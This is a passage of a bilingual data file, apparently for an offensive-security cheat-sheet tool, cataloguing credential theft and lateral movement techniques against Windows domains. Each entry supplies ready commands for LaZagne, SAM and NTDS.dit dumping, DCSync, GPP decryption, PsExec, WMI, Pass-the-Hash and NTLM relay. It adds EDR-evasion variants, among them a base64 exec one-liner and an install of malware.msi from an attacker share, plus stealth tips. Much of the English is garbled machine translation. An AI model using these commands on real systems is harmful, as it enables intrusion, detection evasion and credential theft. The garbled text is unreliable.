        description: { zh: '抓取浏览器保存的密码', en: 'Dump browser saved passwords' },
        platform: 'windows'
      },
      {
        title: { zh: 'WiFi凭证', en: 'WiFiCredentials' },
        command: 'laZagne.exe wifi',
        description: { zh: '抓取WiFi密码', en: 'Dump WiFi passwords' },
        platform: 'windows'
      },
      {
        title: { zh: '邮件客户端', en: 'Email client' },
        command: 'laZagne.exe mails',
        description: { zh: '抓取邮件客户端密码', en: 'Dump email client passwords' },
        platform: 'windows'
      },
      {
        title: { zh: '数据库凭证', en: 'DatabaseCredentials' },
        command: 'laZagne.exe databases',
        description: { zh: '抓取数据库客户端密码', en: 'Dump database client passwords' },
        platform: 'windows'
      },
      {
        title: { zh: 'Linux版本', en: 'Linux Version' },
        command: 'python laZagne.py all',
        description: { zh: 'Linux版本抓取', en: 'Linux version credential dump' },
        platform: 'linux'
      }
    ],
    edrBypass: [
      {
        title: { zh: '混淆执行', en: 'ObfuscationExecute' },
        command: 'python -c "exec(__import__(\\"base64\\").b64decode(\\"BASE64_PAYLOAD\\"))"',
        description: { zh: 'Base64编码执行', en: 'Base64 EncodingExecute' }
      }
    ],
    analysis: { zh: 'LaZagne可以从浏览器、邮件客户端、数据库客户端等多种应用程序中提取保存的凭证。', en: 'LaZagne can extract saved credentials from browsers, email clients, database clients, and many other applications.' },
    opsecTips: [{ zh: 'LaZagne会被杀软检测', en: 'LaZagneWill by AntivirusDetection' }, { zh: '考虑使用混淆或内存加载', en: 'Consider using obfuscation or in-memory loading' }, { zh: '可以只运行特定模块', en: 'can only RunspecificModule' }],
    tutorial: {
      overview: { zh: 'LaZagne是一款开源的凭证抓取工具，支持从多种应用程序中提取保存的密码。', en: 'LaZagne is an open-source credential harvesting tool that extracts saved passwords from a wide range of applications.' },
      vulnerability: { zh: '许多应用程序以不安全的方式存储用户凭证，LaZagne可以提取这些凭证。', en: 'Many applications store user credentials insecurely, and LaZagne can extract them.' },
      exploitation: { zh: '利用流程：1) 获取目标机器访问权限；2) 运行LaZagne；3) 提取凭证；4) 使用凭证横向移动。', en: 'Exploitationworkflow: 1) ObtainTargetMachineAccessPermission; 2) RunLaZagne; 3) Extract Credentials; 4) UseCredentialsLateral Movement.' },
      mitigation: { zh: '防御措施：1) 不在应用程序中保存密码；2) 使用密码管理器；3) 监控异常进程。', en: 'Defensemeasures: 1) not in ApplicationMiddleSavePassword; 2) UsePasswordManagementTool; 3) MonitoringExceptionProcess.' },
      difficulty: 'beginner'
    }
  },
  {
    id: 'sam-dump',
    name: { zh: 'SAM数据库导出', en: 'SAM Database Export' },
    description: { zh: '导出Windows SAM数据库获取本地账户哈希', en: 'ExportWindows SAMDatabaseObtainLocalAccounthash' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: 'SAM',
    tags: ['sam', 'hash', 'windows', 'local'],
    prerequisites: [{ zh: '管理员权限', en: 'ManagementMemberPermission' }, { zh: 'Windows系统', en: 'WindowsSystem' }],
    execution: [
      {
        title: { zh: 'reg导出', en: 'regExport' },
        command: 'reg save HKLM\\SAM sam.hive & reg save HKLM\\SYSTEM system.hive',
        description: { zh: '导出SAM和SYSTEM配置单元', en: 'Export SAM and SYSTEMConfigurationSingleElement' },
        platform: 'windows',
        requiresAdmin: true,
        syntaxBreakdown: [
          { part: 'reg save', explanation: { zh: '注册表导出命令', en: 'RegistryExportCommand' }, type: 'command' },
          { part: 'HKLM\\SAM', explanation: { zh: 'SAM配置单元路径', en: 'SAMConfigurationSingleElementPath' }, type: 'value' },
          { part: 'sam.hive', explanation: { zh: '输出文件名', en: 'OutputFilename' }, type: 'value' }
        ]
      },
      {
        title: { zh: 'Impacket解析', en: 'Impacket parsing' },
        command: 'secretsdump.py -sam sam.hive -system system.hive LOCAL',
        description: { zh: '使用Impacket解析SAM', en: 'UseImpacket parsingSAM' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'secretsdump.py', explanation: { zh: 'Impacket凭证转储工具', en: 'Impacket credential dumping tools' }, type: 'command' },
          { part: '-sam', explanation: { zh: 'SAM文件', en: 'SAMFile' }, type: 'parameter' },
          { part: '-system', explanation: { zh: 'SYSTEM文件', en: 'SYSTEMFile' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: 'Mimikatz导出', en: 'MimikatzExport' },
        command: 'mimikatz.exe "lsadump::sam" "exit"',
        description: { zh: '使用Mimikatz导出SAM', en: 'UseMimikatzExport SAM' },
        platform: 'windows',
        requiresAdmin: true
      },
      {
        title: 'Volume Shadow Copy',
        command: 'vssadmin create shadow /for=C: & copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\temp\\sam.hive',
        description: { zh: '从卷影副本复制SAM', en: 'Copy SAM from volume shadow copy' },
        platform: 'windows',
        requiresAdmin: true
      }
    ],
    analysis: { zh: 'SAM数据库包含本地账户的NTLM哈希，可以用于破解或Pass-the-Hash。', en: 'SAMDatabasecontainsLocalAccount NTLMhash, can used for Crack or Pass-the-Hash.' },
    opsecTips: [{ zh: '需要管理员权限', en: 'requiresManagementMemberPermission' }, { zh: '操作注册表可能触发告警', en: 'operationRegistryPossibleTriggerAlert' }, { zh: '卷影副本方法更隐蔽', en: 'The volume shadow copy method is stealthier' }],
    tutorial: {
      overview: { zh: 'SAM数据库存储Windows本地账户的密码哈希，可以导出后离线破解或用于Pass-the-Hash。', en: 'The SAM database stores Windows local account password hashes, which can be exported for offline cracking or Pass-the-Hash attacks.' },
      vulnerability: { zh: 'SAM数据库可以被管理员访问，其中的哈希可以用于离线破解或Pass-the-Hash攻击。', en: 'The SAM database is accessible to administrators; hashes within can be used for offline cracking or Pass-the-Hash attacks.' },
      exploitation: { zh: '利用流程：1) 获取管理员权限；2) 导出SAM和SYSTEM；3) 提取哈希；4) 破解或PtH。', en: 'Exploitationworkflow: 1) ObtainManagementMemberPermission; 2) Export SAM and SYSTEM; 3) Extracthash; 4) Crack or PtH.' },
      mitigation: { zh: '防御措施：1) 禁用本地管理员账户；2) 使用强密码；3) 监控注册表访问。', en: 'Defenses: 1) Disable the local administrator account; 2) Use strong passwords; 3) Monitor registry access.' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'ntds-dump',
    name: { zh: 'NTDS.dit导出', en: 'NTDS.dit Export' },
    description: { zh: '导出Active Directory数据库获取所有域用户哈希', en: 'ExportActive DirectoryDatabaseObtainallDomain Usershash' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: 'NTDS',
    tags: ['ntds', 'active-directory', 'hash', 'domain'],
    prerequisites: [{ zh: '域管理员权限', en: 'Domain AdminsPermission' }, { zh: '域控制器访问权限', en: 'DomainControllerAccessPermission' }],
    execution: [
      {
        title: { zh: 'ntdsutil快照', en: 'ntdsutilsnapshot' },
        command: 'ntdsutil "activate instance ntds" "ifm" "create full c:\\temp" "quit" "quit"',
        description: { zh: '使用ntdsutil创建IFM快照', en: 'UsentdsutilCreateIFMsnapshot' },
        platform: 'windows',
        requiresAdmin: true,
        syntaxBreakdown: [
          { part: 'ntdsutil', explanation: { zh: 'Active Directory数据库工具', en: 'Active DirectoryDatabaseTools' }, type: 'command' },
          { part: 'activate instance ntds', explanation: { zh: '激活NTDS实例', en: 'ActivateNTDSinstance' }, type: 'command' },
          { part: 'ifm', explanation: { zh: 'Install From Media模式', en: 'Install From MediaMode' }, type: 'command' }
        ]
      },
      {
        title: 'Volume Shadow Copy',
        command: 'vssadmin create shadow /for=C: & copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\temp\\ntds.dit',
        description: { zh: '从卷影副本复制NTDS.dit', en: 'Copy NTDS.dit from volume shadow copy' },
        platform: 'windows',
        requiresAdmin: true
      },
      {
        title: { zh: 'Impacket解析', en: 'Impacket parsing' },
        command: 'secretsdump.py -ntds ntds.dit -system system.hive LOCAL',
        description: { zh: '使用Impacket解析NTDS.dit', en: 'UseImpacket parsingNTDS.dit' },
        platform: 'linux'
      },
      {
        title: { zh: 'Impacket远程转储', en: 'Impacket remote dump' },
        command: 'secretsdump.py domain/admin:password@dc_ip -just-dc',
        description: { zh: '远程转储域哈希', en: 'Remotely dump domain hashes' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-just-dc', explanation: { zh: '只转储域数据', en: 'Dump domain data only' }, type: 'parameter' }
        ]
      },
      {
        title: 'Mimikatz DCSync',
        command: 'mimikatz.exe "lsadump::dcsync /domain:target.com /all" "exit"',
        description: { zh: '使用DCSync同步所有哈希', en: 'UseDCSyncSamestepallhash' },
        platform: 'windows',
        requiresAdmin: true
      }
    ],
    analysis: { zh: 'NTDS.dit包含域内所有用户的哈希，可以用于破解或Pass-the-Hash。', en: 'NTDS.ditcontainsDomainInsideallUsers hash, can used for Crack or Pass-the-Hash.' },
    opsecTips: [{ zh: '需要域管理员权限', en: 'requiresDomain AdminsPermission' }, { zh: 'DCSync方法更隐蔽', en: 'The DCSync method is stealthier' }, { zh: '操作可能触发大量告警', en: 'This operation may trigger a large number of alerts' }],
    tutorial: {
      overview: { zh: 'NTDS.dit是Active Directory数据库，包含域内所有用户的密码哈希。', en: 'NTDS.dit is Active DirectoryDatabase, containsDomainInsideallUsers Passwordhash.' },
      vulnerability: { zh: '域管理员可以导出NTDS.dit或使用DCSync获取所有用户哈希。', en: 'Domain AdminscanExportNTDS.dit or UseDCSyncObtainallUsershash.' },
      exploitation: { zh: '利用流程：1) 获取域管理员权限；2) 导出NTDS.dit或使用DCSync；3) 提取所有哈希；4) 破解或PtH。', en: 'Exploitation workflow: 1) Obtain Domain Admin privileges; 2) Export NTDS.dit or use DCSync; 3) Extract all hashes; 4) Crack or use Pass-the-Hash.' },
      mitigation: { zh: '防御措施：1) 监控域管理员活动；2) 审计DCSync操作；3) 使用强密码。', en: 'Defenses: 1) Monitor Domain Admin activity; 2) Audit DCSync operations; 3) Use strong passwords.' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'gpp-password',
    name: { zh: 'GPP密码提取', en: 'GPP Password Extraction' },
    description: { zh: '提取组策略首选项中的密码', en: 'Extract passwords from Group Policy Preferences' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: 'GPP',
    tags: ['gpp', 'group-policy', 'password', 'xml'],
    prerequisites: [{ zh: '域环境', en: 'DomainEnvironment' }, { zh: '任意域用户凭证', en: 'ArbitraryDomain UsersCredentials' }],
    execution: [
      {
        title: { zh: '查找GPP文件', en: 'FindGPPFile' },
        command: 'find /domain/sysvol -name "*.xml" 2>/dev/null',
        description: { zh: '查找SYSVOL中的XML文件', en: 'FindSYSVOLMiddle XMLFile' },
        platform: 'linux'
      },
      {
        title: { zh: 'PowerShell查找', en: 'PowerShellFind' },
        command: 'Get-ChildItem -Path "\\\\domain.com\\SYSVOL" -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "\\.xml$"}',
        description: { zh: 'PowerShell查找GPP文件', en: 'PowerShellFindGPPFile' },
        platform: 'windows'
      },
      {
        title: { zh: 'PowerView提取', en: 'PowerViewExtract' },
        command: 'Get-NetGPPPassword',
        description: { zh: '使用PowerView提取GPP密码', en: 'UsePowerViewExtractGPPPassword' },
        platform: 'windows'
      },
      {
        title: 'gpp-decrypt',
        command: 'gpp-decrypt HASH',
        description: { zh: '解密GPP密码哈希', en: 'DecryptionGPPPasswordhash' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'gpp-decrypt', explanation: { zh: 'GPP密码解密工具', en: 'GPPPasswordDecryptionTools' }, type: 'command' }
        ]
      },
      {
        title: { zh: 'Impacket提取', en: 'ImpacketExtract' },
        command: 'Get-GPPPassword.py domain/user:password@dc_ip',
        description: { zh: '使用Impacket提取GPP密码', en: 'UseImpacketExtractGPPPassword' },
        platform: 'linux'
      }
    ],
    analysis: { zh: 'GPP密码使用公开的密钥加密，可以被解密获取明文密码。', en: 'GPPPasswordUsepublic keyEncryption, can by DecryptionObtainplaintextPassword.' },
    opsecTips: [{ zh: 'GPP密码是常见的信息泄露点', en: 'GPPPassword is common InformationLeakpoint' }, { zh: '只需要普通域用户权限', en: 'Only requires regular domain user privileges' }, { zh: 'MS14-025修复后新密码不会被存储', en: 'After the MS14-025 patch, new passwords will no longer be stored this way' }],
    tutorial: {
      overview: { zh: '组策略首选项(GPP)可以存储本地管理员密码，使用公开密钥加密，可以被解密。', en: 'Group Policy Preferences (GPP) can store local administrator passwords encrypted with a publicly known key, making them decryptable.' },
      vulnerability: { zh: 'GPP使用公开的AES密钥加密密码，任何人都可以解密。', en: 'GPP uses a publicly disclosed AES key to encrypt passwords — anyone can decrypt them.' },
      exploitation: { zh: '利用流程：1) 访问SYSVOL；2) 查找GPP XML文件；3) 提取cpassword；4) 解密密码。', en: 'Exploitationworkflow: 1) AccessSYSVOL; 2) FindGPP XMLFile; 3) Extractcpassword; 4) DecryptionPassword.' },
      mitigation: { zh: '防御措施：1) 安装MS14-025补丁；2) 删除现有的GPP密码；3) 使用LAPS管理本地管理员密码。', en: 'Defenses: 1) Install the MS14-025 patch; 2) Delete existing GPP passwords; 3) Use LAPS to manage local administrator passwords.' },
      difficulty: 'beginner'
    }
  },

  // ==================== 横向移动 ====================
  {
    id: 'lateral-psexec',
    name: { zh: 'PsExec横向移动', en: 'PsExec Lateral Movement' },
    description: { zh: '使用PsExec进行横向移动', en: 'UsePsExec perform Lateral Movement' },
    category: { zh: '横向移动', en: 'Lateral Movement' },
    subCategory: 'SMB',
    tags: ['psexec', 'lateral', 'smb', 'windows'],
    prerequisites: [{ zh: '目标机器开放445端口', en: 'Target machine has port 445 open' }, { zh: '拥有目标机器管理员凭证', en: 'Possess administrator credentials for the target machine' }, { zh: 'ADMIN$共享可访问', en: 'ADMIN$SharesCanAccess' }],
    execution: [
      {
        title: { zh: '基本使用', en: 'basicUse' },
        command: 'psexec.py domain/user:password@target_ip',
        description: { zh: '使用Impacket的psexec.py连接目标', en: 'UseImpacket psexec.pyConnectionTarget' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'psexec.py', explanation: { zh: 'Impacket工具，实现PsExec功能', en: 'ImpacketTools, ImplementPsExecFunction' }, type: 'command' },
          { part: 'domain/user:password', explanation: { zh: '认证信息格式', en: 'AuthenticationInformationFormat' }, type: 'value' },
          { part: '@target_ip', explanation: { zh: '目标IP地址', en: 'Target IP address' }, type: 'value' }
        ]
      },
      {
        title: { zh: '使用哈希连接', en: 'Using HashConnection' },
        command: 'psexec.py -hashes :NTLM_HASH domain/user@target_ip',
        description: { zh: '使用NTLM哈希进行Pass-the-Hash', en: 'UseNTLMhash perform Pass-the-Hash' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-hashes', explanation: { zh: '指定哈希认证', en: 'specifiedhashAuthentication' }, type: 'parameter' },
          { part: ':NTLM_HASH', explanation: { zh: 'NTLM哈希值(LM:NTLM格式，LM留空)', en: 'NTLM hash value (LM:NTLM format — leave LM blank)' }, type: 'value' }
        ]
      },
      {
        title: { zh: '执行命令', en: 'Execute Command' },
        command: 'psexec.py domain/user:password@target_ip "whoami"',
        description: { zh: '在目标机器执行命令', en: 'in TargetMachineExecute Command' },
        platform: 'linux'
      },
      {
        title: 'Windows PsExec',
        command: 'PsExec.exe \\\\target_ip -u domain\\user -p password cmd.exe',
        description: { zh: '使用Sysinternals PsExec', en: 'UseSysinternals PsExec' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: '\\\\target_ip', explanation: { zh: '目标机器IP', en: 'TargetMachineIP' }, type: 'value' },
          { part: '-u', explanation: { zh: '指定用户名', en: 'specifiedUsername' }, type: 'parameter' },
          { part: '-p', explanation: { zh: '指定密码', en: 'specifiedPassword' }, type: 'parameter' }
        ]
      }
    ],
    edrBypass: [
      {
        title: { zh: '自定义服务名', en: 'CustomServicename' },
        command: 'psexec.py -service-name CustomService domain/user:password@target_ip',
        description: { zh: '使用自定义服务名避免检测', en: 'Use a custom service name to avoid detection' }
      },
      {
        title: { zh: 'SMBExec替代', en: 'SMBExecAlternative' },
        command: 'smbexec.py domain/user:password@target_ip',
        description: { zh: '使用smbexec.py，不写入磁盘', en: 'Usesmbexec.py, not WriteDisk' }
      }
    ],
    analysis: { zh: 'PsExec通过SMB协议在目标机器创建服务并执行命令，成功后可获得目标机器的Shell。', en: 'PsExec creates a service on the target machine via SMB and executes commands; on success, you obtain a shell on the target.' },
    opsecTips: [{ zh: 'PsExec会在目标机器创建服务，容易被检测', en: 'PsExec creates a service on the target, making it easy to detect' }, { zh: '服务名称和二进制文件可能触发告警', en: 'The service name and binary file may trigger alerts' }, { zh: '考虑使用更隐蔽的横向移动方式', en: 'Consider using stealthier lateral movement techniques' }],
    tutorial: {
      overview: { zh: 'PsExec是Sysinternals套件中的工具，允许在远程机器上执行进程。攻击者常用于横向移动。', en: 'PsExec is a tool from the Sysinternals suite that allows remote process execution. It is commonly used by attackers for lateral movement.' },
      vulnerability: { zh: 'PsExec利用SMB协议和Windows服务机制，通过ADMIN$共享上传可执行文件并创建服务执行。', en: 'PsExecExploitationSMBProtocol and WindowsServiceMechanism, throughADMIN$SharesUploadCanExecuteFile and CreateServiceExecute.' },
      exploitation: { zh: '利用流程：1) 获取目标机器凭证；2) 通过SMB连接目标；3) 上传可执行文件到ADMIN$；4) 创建并启动服务；5) 获取远程Shell。', en: 'Exploitationworkflow: 1) ObtainTargetMachineCredentials; 2) throughSMBConnectionTarget; 3) UploadCanExecuteFile to ADMIN$; 4) Create and Start Service; 5) ObtainRemoteShell.' },
      mitigation: { zh: '防御措施：1) 禁用ADMIN$共享；2) 限制SMB访问；3) 监控服务创建；4) 部署EDR检测异常行为。', en: 'Defensemeasures: 1) DisableADMIN$Shares; 2) RestrictSMBAccess; 3) MonitoringServiceCreate; 4) DeploymentEDRDetectionExceptionbehavior.' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'lateral-wmi',
    name: { zh: 'WMI横向移动', en: 'WMI Lateral Movement' },
    description: { zh: '使用WMI进行横向移动', en: 'UseWMI perform Lateral Movement' },
    category: { zh: '横向移动', en: 'Lateral Movement' },
    subCategory: 'WMI',
    tags: ['wmi', 'lateral', 'windows', 'remote'],
    prerequisites: [{ zh: '目标机器开放135端口', en: 'Target machine has port 135 open' }, { zh: '拥有目标机器管理员凭证', en: 'Possess administrator credentials for the target machine' }, { zh: 'WMI服务可访问', en: 'WMIServiceCanAccess' }],
    execution: [
      {
        title: { zh: 'WMI执行命令', en: 'WMIExecute Command' },
        command: 'wmic /node:target_ip /user:domain\\user /password:pass process call create "cmd.exe /c whoami"',
        description: { zh: '使用WMIC远程执行命令', en: 'UseWMICRemoteExecute Command' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'wmic', explanation: { zh: 'Windows管理工具命令行', en: 'WindowsManagementToolsCommandline' }, type: 'command' },
          { part: '/node:', explanation: { zh: '指定目标机器', en: 'specifiedTargetMachine' }, type: 'parameter' },
          { part: '/user:', explanation: { zh: '指定用户名', en: 'specifiedUsername' }, type: 'parameter' },
          { part: 'process call create', explanation: { zh: '调用创建进程方法', en: 'CallCreateProcessMethod' }, type: 'command' }
        ]
      },
      {
        title: 'Impacket wmiexec',
        command: 'wmiexec.py domain/user:password@target_ip',
        description: { zh: '使用Impacket的wmiexec.py', en: 'UseImpacket wmiexec.py' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'wmiexec.py', explanation: { zh: 'Impacket WMI执行工具', en: 'Impacket WMIExecuteTools' }, type: 'command' }
        ]
      },
      {
        title: { zh: '使用哈希', en: 'Using Hash' },
        command: 'wmiexec.py -hashes :NTLM_HASH domain/user@target_ip',
        description: { zh: 'Pass-the-Hash通过WMI', en: 'Pass-the-HashthroughWMI' },
        platform: 'linux'
      },
      {
        title: 'PowerShell WMI',
        command: 'Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName target_ip -Credential $cred',
        description: { zh: '使用PowerShell WMI', en: 'UsePowerShell WMI' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'Invoke-WmiMethod', explanation: { zh: 'PowerShell WMI方法调用', en: 'PowerShell WMIMethodCall' }, type: 'command' },
          { part: 'Win32_Process', explanation: { zh: 'WMI进程类', en: 'WMIProcessClass' }, type: 'value' },
          { part: '-ComputerName', explanation: { zh: '目标计算机名', en: 'TargetComputersname' }, type: 'parameter' }
        ]
      }
    ],
    edrBypass: [
      {
        title: { zh: 'WMI事件订阅', en: 'WMI event subscription' },
        command: 'wmic /node:target_ip /user:domain\\user /password:pass path win32_product call install /package:"\\\\attacker\\share\\malware.msi"',
        description: { zh: '通过WMI安装MSI包执行代码', en: 'throughWMIInstallationMSIPackageExecuteCode' }
      }
    ],
    analysis: { zh: 'WMI横向移动不会在目标机器创建服务，相对PsExec更隐蔽。', en: 'WMI lateral movement does not create a service on the target, making it stealthier than PsExec.' },
    opsecTips: [{ zh: 'WMI执行不会留下明显的文件痕迹', en: 'WMI execution does not leave obvious file artifacts' }, { zh: '但WMI活动可能被监控', en: 'However, WMI activity may still be monitored' }, { zh: '命令输出通过临时文件获取', en: 'CommandOutputthroughtemporaryFileObtain' }],
    tutorial: {
      overview: { zh: 'WMI(Windows Management Instrumentation)是Windows管理框架的核心组件，可用于远程管理和命令执行。', en: 'WMI(Windows Management Instrumentation) is WindowsManagementFramework CoreComponent, Can used for RemoteManagement and Command Execution.' },
      vulnerability: { zh: 'WMI允许管理员远程管理Windows系统，攻击者可以利用此功能执行命令和横向移动。', en: 'WMI allows administrators to remotely manage Windows systems; attackers can abuse this capability to execute commands and move laterally.' },
      exploitation: { zh: '利用流程：1) 获取目标凭证；2) 通过WMI连接目标；3) 调用Win32_Process创建进程；4) 执行命令获取结果。', en: 'Exploitationworkflow: 1) ObtainTargetCredentials; 2) throughWMIConnectionTarget; 3) CallWin32_ProcessCreateProcess; 4) Execute CommandObtainResult.' },
      mitigation: { zh: '防御措施：1) 限制WMI远程访问；2) 监控WMI活动；3) 部署EDR检测异常WMI调用；4) 使用防火墙限制135端口。', en: 'Defenses: 1) Restrict remote WMI access; 2) Monitor WMI activity; 3) Deploy EDR to detect anomalous WMI calls; 4) Use firewall rules to restrict port 135.' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'pass-the-hash',
    name: { zh: 'Pass-the-Hash攻击', en: 'Pass-the-Hash Attack' },
    description: { zh: '使用NTLM哈希进行身份验证', en: 'UseNTLMhash perform identityVerify' },
    category: { zh: '横向移动', en: 'Lateral Movement' },
    subCategory: { zh: '认证攻击', en: 'Authentication Attack' },
    tags: ['pth', 'ntlm', 'hash', 'authentication'],
    prerequisites: [{ zh: '获取用户NTLM哈希', en: 'ObtainUsersNTLMhash' }, { zh: '目标机器允许NTLM认证', en: 'TargetMachineAllowNTLMAuthentication' }, { zh: '目标机器开放SMB/WMI端口', en: 'Target machine has SMB/WMI ports open' }],
    execution: [
      {
        title: 'Impacket PtH',
        command: 'psexec.py -hashes :NTHASH domain/user@target_ip',
        description: { zh: '使用Impacket进行PtH', en: 'UseImpacket perform PtH' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-hashes', explanation: { zh: '指定哈希认证', en: 'specifiedhashAuthentication' }, type: 'parameter' },
          { part: ':NTHASH', explanation: { zh: 'NTLM哈希(LM:NTLM格式)', en: 'NTLMhash(LM:NTLMFormat)' }, type: 'value' }
        ]
      },
      {
        title: 'CrackMapExec PtH',
        command: 'crackmapexec smb target_ip -u user -H NTHASH -d domain',
        description: { zh: '使用CrackMapExec进行PtH', en: 'UseCrackMapExec perform PtH' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'crackmapexec smb', explanation: { zh: 'CrackMapExec SMB模块', en: 'CrackMapExec SMBModule' }, type: 'command' },
          { part: '-H', explanation: { zh: '指定NTLM哈希', en: 'specifiedNTLMhash' }, type: 'parameter' }
        ]
      },
      {
        title: 'Windows PtH',
        command: 'sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH',
        description: { zh: '使用Mimikatz进行PtH', en: 'UseMimikatz perform PtH' },
        platform: 'windows',
        requiresAdmin: true
      },
      {
        title: 'PowerShell PtH',
        command: 'Invoke-SMBClient -Domain domain -User user -Hash NTHASH -Target target_ip',
        description: { zh: '使用PowerShell进行PtH', en: 'UsePowerShell perform PtH' },
        platform: 'windows'
      }
    ],
    edrBypass: [
      {
        title: 'Overpass-the-Hash',
        command: 'sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH /run:cmd.exe',
        description: { zh: '将哈希转换为Kerberos票据', en: 'Convert hashes to Kerberos tickets' }
      }
    ],
    analysis: { zh: 'PtH成功后可以该用户身份访问目标机器，无需明文密码。', en: 'After a successful PtH, you can access the target machine as that user without the plaintext password.' },
    opsecTips: [{ zh: 'PtH不会产生登录日志中的密码验证', en: 'PtH does not generate password verification entries in the logon log' }, { zh: '但会留下网络登录日志', en: 'But it does leave network logon entries' }, { zh: '注意时间戳和来源IP', en: 'Pay attention to timestamps and source IPs' }],
    tutorial: {
      overview: { zh: 'Pass-the-Hash是一种利用NTLM哈希进行身份验证的攻击技术，攻击者无需知道明文密码即可通过认证。', en: 'Pass-the-Hash is an attack technique that uses NTLM hashes for authentication — the attacker does not need the plaintext password.' },
      vulnerability: { zh: 'NTLM认证机制允许使用密码哈希进行认证，一旦哈希泄露，攻击者可以冒充用户身份。', en: 'The NTLM authentication mechanism allows authentication using password hashes; once a hash is leaked, an attacker can impersonate the user.' },
      exploitation: { zh: '利用流程：1) 获取用户NTLM哈希；2) 使用工具进行PtH；3) 获取目标机器访问权限；4) 执行后续攻击。', en: 'Exploitation workflow: 1) Obtain the user\'s NTLM hash; 2) Perform PtH with an appropriate tool; 3) Gain access to the target machine; 4) Execute follow-up attacks.' },
      mitigation: { zh: '防御措施：1) 限制NTLM认证；2) 启用Kerberos；3) 监控异常登录；4) 使用受限管理模式。', en: 'Defenses: 1) Restrict NTLM authentication; 2) Enforce Kerberos; 3) Monitor anomalous logons; 4) Use Restricted Admin mode.' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'ntlm-relay',
    name: { zh: 'NTLM Relay攻击', en: 'NTLM Relay Attack' },
    description: { zh: 'NTLM中继攻击技术', en: 'NTLMRelayAttackTechnique' },
    category: { zh: '横向移动', en: 'Lateral Movement' },
    subCategory: { zh: '认证攻击', en: 'Authentication Attack' },
    tags: ['ntlm', 'relay', 'smb', 'authentication'],
    prerequisites: [{ zh: '目标机器开放SMB端口', en: 'Target machine has SMB port open' }, { zh: '目标机器未启用SMB签名', en: 'TargetMachine not yet EnableSMBSignature' }, { zh: '可诱导目标机器认证', en: 'Can coerce the target machine to authenticate' }],
    execution: [
      {
        title: { zh: 'Responder监听', en: 'Responderlistening' },
        command: 'responder -I eth0 -wrf',
        description: { zh: '启动Responder监听NTLM认证', en: 'StartResponderlisteningNTLMAuthentication' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'responder', explanation: { zh: 'NTLM/LLMNR/NBT-NS欺骗工具', en: 'NTLM/LLMNR/NBT-NSSpoofingTools' }, type: 'command' },
          { part: '-I', explanation: { zh: '指定网络接口', en: 'specifiedNetworkInterface' }, type: 'parameter' },
          { part: '-wrf', explanation: { zh: '启用WPAD、Finger、FTP服务', en: 'EnableWPAD, Finger, FTPService' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: 'ntlmrelayx攻击', en: 'ntlmrelayxAttack' },
        command: 'ntlmrelayx.py -tf targets.txt -smb2support',
        description: { zh: '使用ntlmrelayx进行中继攻击', en: 'Usentlmrelayx perform RelayAttack' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'ntlmrelayx.py', explanation: { zh: 'Impacket NTLM中继工具', en: 'Impacket NTLMRelayTools' }, type: 'command' },
          { part: '-tf', explanation: { zh: '目标文件', en: 'TargetFile' }, type: 'parameter' },
          { part: '-smb2support', explanation: { zh: '支持SMB2协议', en: 'supportsSMB2Protocol' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '中继到LDAP', en: 'Relay to LDAP' },
        command: 'ntlmrelayx.py -t ldap://dc_ip -smb2support --escalate-user user',
        description: { zh: '中继到LDAP进行权限提升', en: 'Relay to LDAP perform Privilege Escalation' },
        platform: 'linux'
      },
      {
        title: { zh: 'IPv6中继', en: 'IPv6Relay' },
        command: 'mitm6 -d domain.com & ntlmrelayx.py -t ldap://dc_ip -wh attacker_ip',
        description: { zh: '使用IPv6进行NTLM中继', en: 'UseIPv6 perform NTLMRelay' },
        platform: 'linux'
      }
    ],
    edrBypass: [
      {
        title: 'Drop the MIC',
        command: 'ntlmrelayx.py -t smb://target --remove-mic',
        description: { zh: '移除MIC标志绕过签名验证', en: 'RemoveMICflagBypassSignatureVerify' }
      }
    ],
    analysis: { zh: 'NTLM Relay成功后可以获取目标机器的访问权限或提升域权限。', en: 'A successful NTLM Relay grants access to the target machine or escalates domain privileges.' },
    opsecTips: [{ zh: '需要目标机器未启用SMB签名', en: 'requiresTargetMachine not yet EnableSMBSignature' }, { zh: '域控制器默认启用签名', en: 'DomainControllerDefaultEnableSignature' }, { zh: 'IPv6中继更隐蔽', en: 'IPv6 relay is stealthier' }],
    tutorial: {
      overview: { zh: 'NTLM Relay是一种中间人攻击，攻击者将捕获的NTLM认证中继到其他服务，实现身份冒用。', en: 'NTLM Relay is a man-in-the-middle attack where the attacker relays captured NTLM authentication to another service, impersonating the victim.' },
      vulnerability: { zh: 'NTLM协议本身存在设计缺陷，允许中继攻击。如果目标服务器未启用签名验证，攻击者可以冒充受害者身份。', en: 'The NTLM protocol has inherent design flaws that permit relay attacks. If the target server does not enforce signing, the attacker can impersonate the victim.' },
